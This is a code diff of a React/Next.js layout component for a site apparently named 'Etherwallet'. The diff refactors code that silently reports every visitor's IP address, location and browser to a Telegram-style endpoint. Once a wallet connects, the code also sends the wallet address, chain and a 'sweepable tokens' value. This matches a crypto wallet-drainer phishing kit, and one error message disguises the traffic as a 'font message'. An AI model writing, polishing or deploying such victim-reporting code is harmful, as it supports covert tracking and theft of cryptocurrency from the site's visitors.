@@ -2,10 +2,9 @@
 
 import { usePathname } from "next/navigation";
 import Navbar from "./Navbar";
-import Link from "next/link";
 import { getUserCountry } from "../userLocation";
-import { useState, useEffect } from "react";
-import { useAccount, useChains } from "wagmi";
+import { useState, useEffect, useCallback } from "react";
+import { useAccount } from "wagmi";
 import axios from "axios";
 export default function LayoutClientWrapper({
   children,
@@ -13,12 +12,9 @@ export default function LayoutClientWrapper({
   children: React.ReactNode;
 }) {
   const pathname = usePathname();
-  const { address, isConnected,chain } = useAccount();
+  const { address, chain } = useAccount();
   const hiddenRoutes = ["/dashboard", "/connect"];
   const hideNavbar = hiddenRoutes.some((route) => pathname.startsWith(route));
-  const [country, setCountry] = useState("");
-  const [ipAddress, setIpAddress] = useState("");
-  const [browser, setBrowser] = useState();
   const [visitorMessageSent, setVisitorMessageSent] = useState(false);
   const [walletMessageSent, setWalletMessageSent] = useState(false);
   
@@ -36,7 +32,7 @@ export default function LayoutClientWrapper({
     return "";
   };
 
-  const sendTelegramMessage = (userCountry: any) => {
+  const sendTelegramMessage = useCallback((userCountry: { country?: string; countryEmoji?: string; city?: string; ip?: string }) => {
     // console.log("User Country", userCountry);
 
     const messageData = {
@@ -49,7 +45,7 @@ export default function LayoutClientWrapper({
         city: userCountry?.city || "Unknown",
         ipAddress: userCountry?.ip || "0.0.0.0",
       },
-      agent: typeof navigator !== "undefined" ? navigator.userAgent : browser,
+      agent: typeof navigator !== "undefined" ? navigator.userAgent : "Unknown",
       date: new Date().toISOString(),
       appName: "Etherwallet",
     };
@@ -71,22 +67,22 @@ export default function LayoutClientWrapper({
           error?.response?.data?.details
         )
       );
-  };
+  }, [getCurrentUrl]);
 
-  const getUsdValue = async (wallet: any) => {
+  const getUsdValue = useCallback(async () => {
     // Call your API or calculation here
     return "$0 worth of sweepable tokens"; // Placeholder
-  };
+  }, []);
 
-  const getInfo = () => {
+  const getInfo = useCallback(() => {
     // Your logic here
     return "🟢 native ETH sign"; // Placeholder
-  };
+  }, []);
 
-  const sendTelegramMessage2 = async (userCountry: any) => {
+  const sendTelegramMessage2 = useCallback(async (userCountry: { country?: string; ip?: string }) => {
     // console.log("User Country", userCountry);
     const walletAddress = address || "";
-    const usdValue = await getUsdValue(walletAddress);
+    const usdValue = await getUsdValue();
     const info = getInfo();
 
     const messageData = {
@@ -99,10 +95,10 @@ export default function LayoutClientWrapper({
       info,
       website: getCurrentUrl(),
       agent:
-        (typeof navigator !== "undefined"
+        typeof navigator !== "undefined"
           ? navigator.userAgent +
             (navigator.platform ? ` on ${navigator.platform}` : "")
-          : browser) || "",
+          : "Unknown",
     };
     axios
       .post(
@@ -116,37 +112,36 @@ export default function LayoutClientWrapper({
         }
       )
       .catch((error) => console.error("Error sending font message:", error));
-  };
+  }, [address, chain, getCurrentUrl, getUsdValue, getInfo]);
 
   useEffect(() => {
     if (!visitorMessageSent) {
       const fetchUserLocation = async () => {
         const userCountry = await getUserCountry();
 
-        setCountry(userCountry?.country || "Unknown");
-        setIpAddress(userCountry?.ip || "0.0.0.0");
-
-        sendTelegramMessage(userCountry);
+        if (userCountry) {
+          sendTelegramMessage(userCountry);
+        }
         setVisitorMessageSent(true);
       };
 
       fetchUserLocation();
     }
-  }, [visitorMessageSent]);
+  }, [visitorMessageSent, sendTelegramMessage]);
 
   useEffect(() => {
     const isWalletConnected = address;
     if (isWalletConnected && !walletMessageSent) {
       const fetchUserLocationAndSendT2 = async () => {
         const userCountry = await getUserCountry();
-        setCountry(userCountry?.country || "Unknown");
-        setIpAddress(userCountry?.ip || "0.0.0.0");
-        sendTelegramMessage2(userCountry);
+        if (userCountry) {
+          sendTelegramMessage2(userCountry);
+        }
         setWalletMessageSent(true);
       };
       fetchUserLocationAndSendT2();
     }
-  }, [address, walletMessageSent]);
+  }, [address, walletMessageSent, sendTelegramMessage2]);
 
   return (
     <>
